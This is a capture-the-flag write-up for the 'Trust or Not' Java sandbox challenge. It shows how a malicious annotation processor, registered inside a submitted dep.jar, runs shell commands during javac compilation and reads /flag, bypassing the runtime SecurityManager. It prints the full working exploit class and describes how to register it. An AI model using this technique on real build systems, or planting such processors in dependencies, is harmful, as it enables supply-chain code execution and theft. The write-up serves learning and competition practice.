# Trust or Not

Category: Misc, Pwn

Solves: 7

Solve by: braindead

Points: 357

---

# challenge description

> I just found a safe way to run untrusted Java code!
> 
> nc 139.224.248.65 1337
> 
> <attachment>

The remote accepts a single java source file (Main.java) and a jar file (dep.jar), and does this:

```
javac -cp dep.jar Main.java
java -cp .:dep.jar -Djava.security.manager -Djava.security.policy==/dev/null Main
```

# solution

Java's SecurityManager is slated for deprecation and historically had multiple vulns, but we are
not going to exploit it. Instead we will achieve RCE at "javac" stage: javac supports running
user defined annotation processors and those get automatically loaded from every jar on the classpath.

We define a class `FunProcessor`:

```java
package fun;

import javax.annotation.processing.*;
import javax.lang.model.element.*;
import java.util.*;

public class FunProcessor extends AbstractProcessor {
	static {
		try {
			byte[] b = new byte[10240];
			var n = Runtime.getRuntime().exec(new String[]{"sh", "-c", "ls -la /; ls -la; cat /flag"}).getInputStream().read(b);
			System.out.write(b);
		} catch (Exception e) { }
	}

	public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv)
	{
		return true;
	}
}
```

And put it in the dep.jar along with a service registration in `META-INF/services/javax.annotation.processing.Processor`, so that javac will load it (see Makefile).

With our dep.jar ready, we submit it with an arbitrary Main.java and our little "cat /flag" command will be execute
with no sandboxing what-so-ever.
